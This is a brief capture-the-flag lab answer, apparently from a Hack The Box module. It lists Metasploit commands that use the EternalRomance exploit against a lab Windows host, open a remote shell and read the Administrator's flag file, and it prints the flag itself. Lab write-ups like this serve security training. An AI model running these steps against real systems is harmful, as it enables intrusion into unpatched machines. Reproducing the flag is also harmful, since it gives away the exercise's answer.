# Modules

### Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.

```bash
msfconsole
search eternalromance
use 0
set rhosts 10.129.29.212
set lhost 10.10.14.179
set lport 6969
run
shell
type C:\Users\Administrator\Desktop\flag.txt
HTB{MSF-W1nD0w5-3xPL01t4t10n}
```
